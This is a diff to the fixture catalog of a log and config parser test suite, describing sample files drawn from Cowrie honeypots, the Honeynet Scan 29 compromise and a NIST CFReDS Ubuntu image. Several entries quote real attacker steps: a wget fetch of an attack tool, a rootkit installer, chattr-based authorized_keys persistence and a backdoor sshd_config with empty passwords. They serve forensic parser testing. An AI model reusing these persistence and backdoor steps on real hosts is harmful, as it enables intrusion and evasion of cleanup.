@@ -10,13 +10,14 @@ Organized by `file_type` (matching `backend/parsers/registry.py` keys).
 
 ## Currently-implemented parsers
 
-### `auth_log/` — 6 files
+### `auth_log/` — 7 files
 - `auth.log` — original user-provided sample (pre-existing)
 - `loghub_linux_2k.log` — logpai/loghub `Linux/Linux_2k.log` (2,000-line anonymized Linux auth corpus)
 - `loghub_openssh_2k.log` — logpai/loghub `OpenSSH/OpenSSH_2k.log` (sshd-focused)
 - `lastlog_audit_compromised` — franckferman/LastLog-Audit `samples/compromised.auth.log` (realistic red-team scenario)
 - `masterparser_example` — securityjoes/MasterParser `01-Logs/MasterParser-Example-auth.log`
 - `honeynet_scan29_rh72_secure` — Honeynet Project Scan 29 (`linux-suspended.tar.bz2`), extracted from `/var/log/secure` of the compromised Red Hat 7.2 honeypot (Aug 2003). Tiny (179 B, 2 entries) but a genuine RHEL "secure" log fragment — `xinetd[732]: START: telnet pid=15169 from=193.109.122.5` showing the inetd-era telnet service entry, plus an sshd identification-string-failure event. Distinct from the Debian-style `auth.log` formats already in the corpus.
+- `cfreds_nps2009_ubuntu_810_auth_log` — NIST CFReDS `nps-2009-casper-rw` Ubuntu 8.10 USB image, extracted `/var/log/auth.log` (19 KB, 194 lines). Edge case: the parser counts 194 lines parsed but extracts 0 sshd records — the log is dominated by `gdm-autologin`, `pam_unix(cron:session)`, `su[…]: FAILED su for root`, `sudo: ubuntu : … COMMAND=/bin/bash` events, with no actual sshd connections. Locks in current parser scope (sshd-focused).
 
 ### `authorized_keys/` — 6 files
 - `authorized_keys` — original (pre-existing)
@@ -26,7 +27,7 @@ Organized by `file_type` (matching `backend/parsers/registry.py` keys).
 - `puttygen_attacker_immutable` — IOC from a separate 2024 Cowrie attacker (session `0790cce5c223`, `honeypot-japan`, src 94.103.125.37). Distinct from `outlaw_attacker_dropped`: PuTTYgen-format key (`AAAAB3NzaC1yc2EAAAADAQABAAABAQ...`, comment `rsa-key-20230629`), and the dropping operator follows it with `chattr +ai ~/.ssh/authorized_keys` to make the file append-only AND immutable — defeating naive cleanup. Useful for testing parsers against PuTTY-format keys (different MPI encoding than OpenSSH-generated `AAAAB3NzaC1yc2EAAAABJQ...`).
 - `ethos_miner_attacker_dropped` — IOC from a 2020 Cowrie attacker targeting EthOS cryptomining rigs (sweetie-data session `382575d10851`, src 80.229.157.225, login as `user`). Distinct from the other two attacker keys: no comment field, key is appended (not replacing the file), the campaign reads `claymore.stub.conf` / `claymore-zcash.stub.conf` / `sgminer.conf` afterward to steal mining wallet addresses. Companion bash_history fixture: `cowrie_2020_ethos_miner_recon_382575d1`.
 
-### `bash_history/` — 16 files
+### `bash_history/` — 17 files
 
 Benign / numbered-history variant (2):
 - `jc_ubuntu_18_04_history`, `jc_centos_7_7_history` — kellyjonbrazil/jc `tests/fixtures/{ubuntu-18.04,centos-7.7}/history.out`
@@ -52,16 +53,20 @@ Real attacker sessions from Cowrie honeypots (13, one per distinct attack patter
 Real post-compromise host bash_history (1):
 - `honeynet_scan29_rh72_root_post_compromise` — Honeynet Project Scan 29, extracted from `.bash_history` at the FS root (inode 3188; the `/root/.bash_history` symlink was redirected to /dev/null by the attacker for evasion). 14 lines, 235 B, captures the actual post-compromise interactive shell of the attacker on a Red Hat 7.2 honeypot (Aug 2003). Distinctive content: `cd /dev/shm/sc; ./install sbm79.dtc.apu.edu` (rootkit installer with academic-network masquerade hostname), `wget izolam.net/sslstop.tar.gz` (SSL-stop tool), `kill -9 21510 21511 23289 23292 23302` (terminating Apache to free port 443). Distinct from the Cowrie samples — those capture the attacker's *typed input as the SSH server saw it*; this is the *resulting host-side `.bash_history` file*, the side defenders actually find on disk.
 
+Benign-user real bash_history (1):
+- `cfreds_nps2009_ubuntu_810_real_user` — NIST CFReDS `nps-2009-casper-rw`, `/home/ubuntu/.bash_history` from the Ubuntu 8.10 bootable-USB casper-rw overlay. 60 lines of normal-user shell activity by Simson Garfinkel (NIST researcher). **First fixture in the corpus that triggers connection extraction in the bash_history parser** — `ssh simsong@192.168.15.5`, `ssh simsong@192.168.15.15`, `ssh simsong@192.168.1.5`, `scp /mnt/ubnist1.gen0.raw simsong@192.168.15.62:.` — the parser finds 4 SSH/SCP connection records. Distinct character (forensic-investigator workflow with `find -exec grep`, gunzip loops, mozilla cache spelunking) vs the attacker-pattern samples.
+
 ### `etc_hosts/` — 5 files
 - `centos_hosts` — original (pre-existing)
 - `jc_ubuntu_18_04_hosts`, `jc_centos_7_7_hosts` — kellyjonbrazil/jc `tests/fixtures/{ubuntu-18.04,centos-7.7}/hosts.out`
 - `saltstack_integration`, `saltstack_modules` — saltstack/salt `tests/integration/files/hosts` + `tests/integration/modules/files/hosts`
 
-### `known_hosts/` — 4 files
+### `known_hosts/` — 5 files
 - `known_hosts` — original (pre-existing)
 - `openssh_portable_hostkeys_unittest` — openssh/openssh-portable `regress/unittests/hostkeys/testdata/known_hosts`
 - `ansible_existing_known_hosts` — ansible/ansible `test/integration/targets/known_hosts/files/existing_known_hosts` (mix of plain, `|1|`-hashed, `@cert-authority`, and multi-key-type entries)
 - `saltstack_integration` — saltstack/salt `tests/integration/files/ssh/known_hosts` (hashed + GitHub ecdsa/ed25519 real keys)
+- `cfreds_nps2009_ubuntu_810_user_hashed` — NIST CFReDS `nps-2009-casper-rw`, `/home/ubuntu/.ssh/known_hosts` — single `|1|`-hashed entry (442 B). Distinct from the existing fixtures: this is a *real user's* known_hosts captured from a real session (`ssh simsong@192.168.15.5` → host key prompt → accepted → file created), not test fixture data. Pure-hashed-only file exercises the parser's `hosts_parsed: 0` + warning path on a realistic OpenSSH-default-strict-host-key file.
 
 ### `nmap_xml/` — 5 files
 - `nmap_example.xml` — original (pre-existing)
@@ -70,11 +75,12 @@ Real post-compromise host bash_history (1):
 - `defectdojo_v6_40` — DefectDojo/sample-scan-files `nmap/nmap_v6.40.xml`
 - `mozilla_minion_v6_40` — mozilla/minion-nmap-plugin `etc/sample-nmap-output.xml`
 
-### `passwd/` — 6 files
+### `passwd/` — 7 files
 - `endlessm_base_passwd_master` — endlessm/base-passwd `passwd.master` (Debian minimal default passwd)
 - `jc_ubuntu_18_04_passwd`, `jc_centos_7_7_passwd`, `jc_osx_10_14_6_passwd` — kellyjonbrazil/jc `tests/fixtures/*/passwd.out`
 - `cowrie_honeyfs_passwd` — cowrie/cowrie `honeyfs/etc/passwd` (honeypot fake passwd served to attackers)
 - `honeynet_scan29_compromised_rh72` — Honeynet Project Scan 29, extracted `/etc/passwd` from the compromised Red Hat 7.2 honeypot (Aug 2003). Real lived-in distro passwd; the attacker added an `admin:x:15:50:User:/var/ftp:/bin/bash` line (gid=50 reusing the `ftp` group, /var/ftp home, bash shell) and altered the existing `ftp` user's gid from 50 → 0 (root group). The parser filters UID < 1000 (rule 7) so neither attacker change is reflected in `host_users_found` — the fixture exercises that filtering on a known-tainted file.
+- `cfreds_nps2009_ubuntu_810_casper` — NIST CFReDS `nps-2009-casper-rw`, `/etc/passwd` from the Ubuntu 8.10 bootable-USB casper-rw overlay. **Boundary-case fixture for the UID < 1000 filter**: the legitimate `ubuntu:x:999:1000:Ubuntu:/home/ubuntu:/bin/bash` user has UID=999 (Ubuntu's pre-2012 default for the live-CD user) so it's *just below* the system-user threshold and gets filtered out — only `root` and `nobody` (the latter via shell-not-nologin) appear in `host_users_found`. Documents the parser's hard 1000 cutoff against a realistic distro that violates it.
 
 ### `private_key/` — 25 files
 - `id_rsa`, `dss_key` — original (pre-existing; non-production keys)
@@ -90,12 +96,13 @@ Real post-compromise host bash_history (1):
 - `openssh_regress_ecdsa_sk_test1`, `openssh_regress_ed25519_sk_test1` — openssh/openssh-portable `regress/unittests/sshkey/testdata/{ecdsa,ed25519}_sk1.pub`. FIDO2 security-key public-key formats (`sk-ecdsa-sha2-nistp256@openssh.com` / `sk-ssh-ed25519@openssh.com`); both parse cleanly as `authorized_key`-style entries. Companion fixtures to the private-key SK pair above.
 - `honeynet_scan29_rootkit_ssh1_host_key_pub` — Honeynet Project Scan 29, companion `/lib/.x/s/s_h_k.pub`. **SSH1-format public key** (`1024 33 <decimal-modulus> root@fred.psiware.net` — note the attacker's hostname leaked in the comment). Distinct from the OpenSSH-format `ssh-rsa AAAA…` keys in the rest of the corpus. Parser warns "Line 1: unrecognised format, skipping" — same regression-locking purpose as the private-key counterpart.
 
-### `shadow/` — 6 files
+### `shadow/` — 7 files
 - `shadow` — original (pre-existing)
 - `jc_ubuntu_18_04_shadow`, `jc_centos_7_7_shadow` — kellyjonbrazil/jc `tests/fixtures/*/shadow.out`
 - `cowrie_honeyfs_shadow` — cowrie/cowrie `honeyfs/etc/shadow` (hashes are fake honeypot bait)
 - `honeynet_scan29_compromised_rh72` — Honeynet Project Scan 29, extracted `/etc/shadow` from the compromised RH 7.2 honeypot. Two real recoverable `$1$` md5crypt hashes — root's password and the attacker-added `admin` user's. Distinct from the existing shadow corpus (which only has `$6$` sha512crypt fixtures from modern distros): tests the parser's handling of legacy md5crypt.
 - `honeynet_scan29_compromised_rh72_backup` — same image, `/etc/shadow-` rotation backup. Captured *before* the attacker set the root password and added the admin user — root's hash field is empty (`root::12247:0:99999:7:::`). Edge case that triggers the parser's locked-account/no-hash filtering on the typically-active `root` line.
+- `cfreds_nps2009_ubuntu_810_casper` — NIST CFReDS `nps-2009-casper-rw`, `/etc/shadow` from the Ubuntu 8.10 bootable-USB casper-rw overlay. Real recoverable hash for the `ubuntu` user with `value_length: 13` — that's **legacy DES `crypt(3)` format** (no `$N$` prefix), distinct from the `$1$`/`$5$`/`$6$` formats already in the corpus. Tests parser handling of pre-2000-era hash format that some embedded/legacy systems still emit. All other accounts including root are `*`-locked (Ubuntu's "no root password" default).
 
 ### `ssh_config/` — 21 files
 - Pre-existing: `config`, `ssh-config-basic`, `ssh-config-patterns`, `ssh-config-proxy`
@@ -114,15 +121,17 @@ Real post-compromise host bash_history (1):
 - `honeynet_scan29_rh72_default` — Honeynet Project Scan 29, extracted `/etc/ssh/sshd_config` from the RH 7.2 honeypot. Vintage 2001-era settings (`$OpenBSD: sshd_config,v 1.38`): `Protocol 2,1` (SSH1+SSH2 both enabled), `ServerKeyBits 768`, `KeyRegenerationInterval 3600`, `PermitRootLogin yes`. Distinct from modern upstream defaults already in the corpus.
 - `honeynet_scan29_rootkit_dropped` — same image, `/lib/.x/s/sshd_config` — the **attacker's hidden backdoor sshd config**, dropped alongside the rootkit's own `s_h_k` host key. Notable settings: `PermitEmptyPasswords yes`, `RhostsRSAAuthentication yes`, `FascistLogging no`, `QuietMode yes`, `HostKey /lib/.x/s/s_h_k`, `PidFile /lib/.x/s/pid` — a real malware artifact, not a synthesized one.
 
-### `sudoers/` — 5 files
+### `sudoers/` — 6 files
 - `sudoers` — original (pre-existing)
 - `official_sudo_project_example` — sudo-project/sudo `examples/sudoers.in` (upstream annotated example)
 - `alitoufighi_ubuntu_default` — gist/alitoufighi/679304d9585304075ba1ad93f80cce0e (Ubuntu 18.04/20.04 default)
 - `keith_macos_14_default` — gist/keith/9061156 (macOS 14.2.1 default)
 - `kapb14_snippets` — gist/kapb14/802537c6a4c74f8ee1fa4e673af8847d (config snippets)
+- `cfreds_nps2009_ubuntu_810_casper` — NIST CFReDS `nps-2009-casper-rw`, `/etc/sudoers` from the Ubuntu 8.10 bootable-USB casper-rw overlay. **Real-world drift example**: the standard `%admin ALL=(ALL) NOPASSWD: ALL` line appears 5 times — likely from someone repeatedly editing the file (e.g. `>> /etc/sudoers` or visudo without checking existing content). Parser captures all 6 rules including duplicates; useful for testing dedup-or-not behavior in callers downstream of the parser.
 
-### `wtmp/` — 1 file (binary)
+### `wtmp/` — 2 files (binary)
 - `compromised.wtmp` — franckferman/LastLog-Audit `samples/compromised.wtmp`
+- `cfreds_nps2009_ubuntu_810_wtmp` — NIST CFReDS `nps-2009-casper-rw`, `/var/log/wtmp` from the Ubuntu 8.10 USB image. 4608 B — Ubuntu 8.10 wtmp record format is *not* a multiple of the parser's expected 382-byte size (it's a multiple of 384, the libc6 utmp size). Parser produces `records_parsed: 0` with a "may be truncated or wrong format" warning. Locks in current behavior — surfaces a potential parser-record-size discrepancy that future work may want to fix.
 
 ---
 
@@ -139,10 +148,11 @@ RHEL/CentOS auth log — format-identical to `auth_log/` per AGENT.md Phase 17
 ### `messages/` — 1 file
 - `loghub_thunderbird_2k.log` — logpai/loghub `Thunderbird/Thunderbird_2k.log`
 
-### `lastlog/` — 9 files (all binary)
-All from franckferman/LastLog-Audit `samples/`: `apt_cozy_bear`, `apt_lazarus`,
+### `lastlog/` — 10 files (all binary)
+- 9 from franckferman/LastLog-Audit `samples/`: `apt_cozy_bear`, `apt_lazarus`,
 `brute_force`, `clean_server`, `compromised`, `insider_threat`,
 `pentest_engagement`, `supply_chain`, `timestomped`.
+- `cfreds_nps2009_ubuntu_810_lastlog` — NIST CFReDS `nps-2009-casper-rw`, `/var/log/lastlog` from the Ubuntu 8.10 USB image (292 KB). Future-phase fixture: no `lastlog` parser is registered yet (Phase 16), so it sits as forward-staged corpus — `tests/test_real_examples/` skips files whose `file_type` isn't in the registry.
 
 ### `last_output/` — 14 files (all from kellyjonbrazil/jc test fixtures)
 - `jc_centos_last`, `jc_centos_last_crash`, `jc_centos_last_wF`, `jc_centos_last_wixF`, `jc_centos_last_w`, `jc_centos_lastb`
@@ -355,6 +365,7 @@ These gaps are genuine — either the file is private by convention (history fil
 - [EfeEmirYuce/Cowrie-Honeypot-Log-Analysis-Engine](https://github.com/EfeEmirYuce/Cowrie-Honeypot-Log-Analysis-Engine) — ~130 MB of 2024 Cowrie JSON logs from a South Africa sensor (selected sessions extracted to `bash_history/cowrie_2024_*`)
 - [0xsha/sweetie-data](https://github.com/0xsha/sweetie-data) — MIT — multi-honeypot capture covering Dec 2019–Feb 2020 (~2.9 GB cowrie JSON across 105 daily logs); selected attacker sessions extracted to `bash_history/cowrie_2020_*` and `authorized_keys/ethos_miner_*`
 - [Honeynet Project — Scan of the Month #29](https://honeynet.onofri.org/scans/scan29/) — Honeynet Project terms permit analysis & redistribution for research. The 102 MB `linux-suspended.tar.bz2` is a VMware-suspended Red Hat 7.2 honeypot compromised on 2003-08-10; the 1 GB ext3 partition was extracted via `qemu-img convert -f vmdk -O raw` + Sleuth Kit (`mmls`/`fls`/`icat`). Files extracted to `passwd/honeynet_scan29_*`, `shadow/honeynet_scan29_*`, `ssh_config/honeynet_scan29_*`, `sshd_config/honeynet_scan29_*` (incl. the rootkit-dropped backdoor config), `bash_history/honeynet_scan29_*` (real post-compromise root shell history), `private_key/` + `public_key/honeynet_scan29_*` (SSH protocol 1 host keys from the rootkit), `auth_log/honeynet_scan29_*` (RHEL `secure` log fragment).
+- [NIST CFReDS — NPS 2009 Casper RW](https://cfreds.nist.gov/) — public-domain US-government forensic reference dataset. The 161 MB `ubnist1.casper-rw.gen3.E01` (downloadable as raw E01 from `digitalcorpora.s3.amazonaws.com`) is the most-used generation of an Ubuntu 8.10 bootable-USB casper-rw overlay (the writable layer over the live-CD), repeatedly booted and used over weeks to browse US-Government websites. Mounted via `ewfmount` → ext3 raw → `fls`/`icat`. Files extracted to `passwd/cfreds_nps2009_*` (uid=999 boundary), `shadow/cfreds_nps2009_*` (legacy DES crypt), `sudoers/cfreds_nps2009_*` (5x duplicated %admin line), `known_hosts/cfreds_nps2009_*` (real `|1|` hashed entry), `bash_history/cfreds_nps2009_*` (first benign-user history fixture, 4 ssh/scp connection records extracted), `auth_log/cfreds_nps2009_*` (Ubuntu auth.log dominated by gdm/cron/su/sudo events), `wtmp/cfreds_nps2009_*` (record-size mismatch edge case), `lastlog/cfreds_nps2009_*` (forward-staged for Phase 16).
 - [canonical/netplan](https://github.com/canonical/netplan) — GPL-3.0 — network YAML examples
 - [sudo-project/sudo](https://github.com/sudo-project/sudo) — ISC — upstream sudoers example
 - [endlessm/base-passwd](https://github.com/endlessm/base-passwd) — GPL-2.0 — Debian passwd.master
